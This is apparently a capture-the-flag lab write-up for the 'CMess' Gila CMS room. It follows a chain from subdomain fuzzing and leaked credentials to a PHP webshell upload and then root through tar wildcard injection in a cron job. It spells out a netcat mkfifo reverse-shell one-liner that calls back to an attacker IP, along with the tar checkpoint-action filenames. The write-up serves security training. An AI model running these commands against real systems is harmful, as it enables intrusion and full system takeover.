CMess: a Gila CMS chain from leaked creds to a wildcard cron privesc

A hidden subdomain, admin credentials sitting in plain sight in a support chat transcript, a file manager that uploads PHP just fine, and a root cron job undone by its own use of a wildcard.

Room: CMess (Gila CMS) Category: Web / Linux Privesc Tools: nmap, wfuzz, tar wildcard injection

The setup: a Gila CMS instance at cmess.thm, nothing else to go on but a hostname. The job: find the real attack surface, get in, and chain it to root.

No single flag in these notes, the target is a root shell.

The Investigation

1
Scan the host and identify the CMS
nmap -sV -sC cmess.thm

Nmap scan report for cmess.thm (10.10.92.204)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS

|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Why this works

nmap's http-generator script fingerprints the CMS directly from the page metadata, no guessing needed before moving on to platform-specific research.

2
Fuzz for a hidden subdomain
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://cmess.thm -H "Host:FUZZ.cmess.thm" --hw 290

ID           Response   Lines    Word     Chars       Payload
000000019:   200        30 L     104 W    934 Ch      "dev"

Adding dev.cmess.thm to /etc/hosts alongside the main domain and loading it turns up a "Development" page containing a support chat transcript, visible without authentication:

andre@cmess.thm:
Have you guys fixed the bug that was found on live?

support@cmess.thm:
Hey Andre, We have managed to fix the misconfigured .htaccess file,
we're hoping to patch it in the upcoming patch!

support@cmess.thm:
Update! We have had to delay the patch due to unforeseen circumstances

andre@cmess.thm:
That's ok, can you guys reset my password if you get a moment, I seem
to be unable to get onto the admin panel.

support@cmess.thm:
Your password has been reset. Here: KPFTN_f2yxe%
Why this works

A `--hw` (hide words) filter in wfuzz suppresses the default "not found" response size so only genuinely different responses, real subdomains, survive the noise. A dev subdomain is exactly the kind of place internal debugging artifacts like a support transcript get left exposed.

3
Log in and upload a webshell through the file manager

The leaked credentials (andre / KPFTN_f2yxe%) log straight into cmess.thm/login, and the account turns out to have admin rights. Gila CMS's admin panel has a built-in Content → File Manager, which uploads arbitrary files, PHP included, with no filtering. A PHP reverse shell uploaded there and loaded directly in the browser (cmess.thm/tmp/rev.php) executes on the server:

nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.57.21] from (UNKNOWN) [10.10.192.161] 51680
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Why this works

Leaked credentials and admin rights are two separate findings, the chat leak alone is useless without also confirming the account can reach the file manager. Once both line up, an unrestricted file upload inside an admin panel is remote code execution with extra steps.

Find a second credential sitting in /opt
www-data@cmess:/opt$ ls -la

UQfsdCB7aP6

That password gets a proper interactive shell over SSH as andre:

ssh andre@10.10.192.161
andre@10.10.192.161's password: UQfsdCB7aP6
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
andre@cmess:~$
Why this works

A world-readable backup credential file in /opt is the kind of leftover that survives long after whatever process created it is forgotten. The webshell foothold as www-data is just a stepping stone to find exactly this.

5
Spot the wildcard in a root cron job
andre@cmess:~$ cat /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2 * * * * root  cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

That job runs tar with a bare * wildcard inside a directory andre controls, a well-known privilege escalation pattern (reference).

Why this works

Shell wildcard expansion happens before the command runs, so a filename crafted to look like a tar flag gets interpreted as one. Anyone who can write files into the directory a root-owned wildcard command targets can smuggle in arguments tar was never meant to receive from an untrusted source.

6
Weaponize the wildcard for a root shell
andre@cmess:~/backup$ ls -la
total 12
drwxr-x--- 2 andre andre 4096 Feb  9  2020 .
drwxr-x--- 4 andre andre 4096 Feb  9  2020 ..
-rwxr-x--- 1 andre andre   51 Feb  9  2020 note

andre@cmess:~/backup$ cat note
Note to self.
Anything in here will be backed up!

andre@cmess:~/backup$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.2.57.21 4444 >/tmp/f' > shell.sh
andre@cmess:~/backup$ chmod +x shell.sh
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh shell.sh"
andre@cmess:~/backup$ echo "" > "--checkpoint=1"

GNU tar's --checkpoint/--checkpoint-action flags, smuggled in as filenames the wildcard expands, make tar execute shell.sh partway through the archive it's building. Two minutes later, when the cron fires as root:

nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.57.21] from (UNKNOWN) [10.10.192.161] 51702
root@cmess:/home/andre/backup#
Why this works

--checkpoint=1 makes tar run the checkpoint action after the first file, and --checkpoint-action=exec=sh shell.sh tells it what to run, both passed in purely as filenames the root-owned tar * picks up and expands as flags. The result: root executes andre's script on a schedule he doesn't control the timing of, but fully controls the content of.

Full Attack Chain

nmap: Gila CMS on cmess.thm
  → wfuzz: dev.cmess.thm found
       → support chat transcript leaks andre's reset password
            → login as andre, admin rights confirmed
                 → File Manager: PHP webshell uploaded and executed (www-data)
                      → /opt/.password.bak: a second password for andre
                           → SSH as andre
                                → /etc/crontab: root tar job with a bare wildcard
                                     → checkpoint-action filenames planted
                                          → cron fires as root, shell.sh runs: root

Takeaways

Dev subdomains leak what production hides

A support chat transcript sitting on an unauthenticated dev subdomain handed over working admin credentials without a single exploit.

An admin file manager is a file upload vulnerability by design

Once authenticated, Gila CMS's File Manager places no real restriction on what gets uploaded or where, turning a leaked password straight into code execution.

Wildcard expansion in privileged scripts is a classic, recurring bug

Any root-owned command that runs * inside a directory a lower-privileged user can write to is one crafted filename away from argument injection, regardless of which binary it is.
